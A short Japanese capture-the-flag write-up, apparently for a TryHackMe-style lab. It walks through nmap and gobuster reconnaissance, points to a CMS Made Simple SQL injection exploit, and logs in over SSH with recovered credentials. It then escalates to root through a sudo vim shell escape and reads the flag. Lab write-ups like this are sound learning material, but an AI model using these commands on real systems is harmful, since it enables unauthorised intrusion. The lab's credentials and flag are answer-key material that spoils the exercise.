まずは偵察

┌──(root㉿kali)-\[~\]

└─# nmap -sV 10.10.143.136

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-01 18:41 JST

Nmap scan report for 10.10.143.136

Host is up (0.35s latency).

Not shown: 997 filtered tcp ports (no-response)

PORT     STATE SERVICE VERSION

21/tcp   open  ftp     vsftpd 3.0.3

80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))

2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 36.02 seconds

webが動いているので

隠しフォルダなどの探索

(root㉿kali)-\[~\]

└─# gobuster dir -u http://10.10.143.136 -w /usr/share/dirb/wordlists/common.txt

\===============================================================

Gobuster v3.6

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

\===============================================================

\[+\] Url:                     http://10.10.143.136

\[+\] Method:                  GET

\[+\] Threads:                 10

\[+\] Wordlist:                /usr/share/dirb/wordlists/common.txt

\[+\] Negative Status codes:   404

\[+\] User Agent:              gobuster/3.6

\[+\] Timeout:                 10s

\===============================================================

Starting gobuster in directory enumeration mode

\===============================================================

/.hta                 (Status: 403) \[Size: 292\]

/.htpasswd            (Status: 403) \[Size: 297\]

/.htaccess            (Status: 403) \[Size: 297\]

/index.html           (Status: 200) \[Size: 11321\]

/robots.txt           (Status: 200) \[Size: 929\]

/server-status        (Status: 403) \[Size: 301\]

/simple               (Status: 301) \[Size: 315\] \[--> http://10.10.143.136/simple/\]

Progress: 4614 / 4615 (99.98%)

\===============================================================

Finished

\===============================================================

/simpleという怪しいフォルダがあるのでアクセスすると、

CMS Made simpleと書いてある

調べるとCVE-2019-9053（SQL injectionの脆弱性)が見つかる

https://www.exploit-db.com/exploits/46635　にexploitがあったのでダウンロードして実行するとエラー

構文がpython2だったのでpython3用に修正したがうまく動かないのでyoutubeでwriteupを見てユーザ名とパスワードゲット

mitch　secret

┌──(root㉿kali)-\[/home/kali\]

└─# ssh mitch@10.10.171.92 -p 2222

mitch@10.10.171.92's password:

Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

\* Documentation:  https://help.ubuntu.com

\* Management:     https://landscape.canonical.com

\* Support:        https://ubuntu.com/advantage

0 packages can be updated.

0 updates are security updates.

Last login: Mon Jan  1 12:54:07 2024 from 10.18.31.142

$ sudo -l -l

User mitch may run the following commands on

Machine:

Sudoers entry:

RunAsUsers: root

Options: !authenticate

Commands:

/usr/bin/vim

$ sudo /usr/bin/vim

$ sudo /usr/bin/vim

$ sudo /usr/bin/vim -c *:!/bin/bash"^\[\[D^\[\[D^\[\[D^\[\[

\[sudo\] password for mitch:

$ sudo /usr/bin/vim -c ":!/bin/bash"

root@Machine:~#

root@Machine:~# cd /root

root@Machine:/root# ls

root.txt

root@Machine:/root# cat root.txt

W3ll d0n3. You made it!

root@Machine:/root#

rootフラグもゲットして終わり